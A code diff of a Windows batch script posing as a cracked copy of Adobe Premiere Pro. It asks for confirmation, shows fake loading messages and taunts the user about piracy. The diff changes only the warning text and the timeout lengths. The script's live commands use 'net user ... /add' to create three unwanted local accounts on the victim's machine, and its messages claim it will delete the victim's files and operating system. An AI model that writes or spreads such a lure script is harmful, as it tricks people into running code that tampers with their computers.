@@ -1,16 +1,16 @@
 @echo off
 BREAK=OFF
-choice /C YN /M "This is a malware. It will delete all your files. And restart your computer several times. Do you want to continue? (Y/N)"
+choice /C YN /M "This is a malware. It will delete all your files and your OS. Do you want to continue? (Y/N)"
 if errorlevel 2 exit
 if errorlevel 1 echo So you chose to proceed. Good luck!
 echo Openinng cracked software...
-timeout /t 1
+timeout /t 2
 echo Loading assets...
 timeout /t 2
 echo Initializing...
 timeout /t 1
 echo Oops! Something went wrong...
-timeout /t 1
+timeout /t 2
 color 4
 echo You really thought you can get Free Premier Pro?
 timeout /t 3
@@ -19,9 +19,9 @@ timeout /t 2
 echo Calculating your punishment...
 timeout /t 3
 echo Say goodbye to all your files!
-timeout /t 1
+timeout /t 2
 echo FEEL THE RAGE OF ADOBE! FEEL PAIN AND REALIZE WHAT YOU HAVE DONE!
-timeout /t 3
+timeout /t 5
 net user Adobe_PW:CreativeCloud CreativeCloud /add
 net user A_Piracy %username% /add
 net user b_is %username% /add
